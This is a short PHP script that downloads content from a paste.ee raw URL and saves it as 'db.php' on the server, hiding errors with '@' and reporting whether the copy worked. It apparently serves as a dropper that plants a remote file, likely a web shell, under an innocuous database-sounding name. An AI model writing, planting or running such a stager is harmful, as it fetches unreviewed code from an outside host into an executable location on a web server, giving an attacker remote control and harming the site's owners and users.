<?php

if ( @copy('https://paste.ee/r/H9LLn', 'db.php') ) {
echo "Copy success!";
}else{
echo "Copy failed.";
}
?>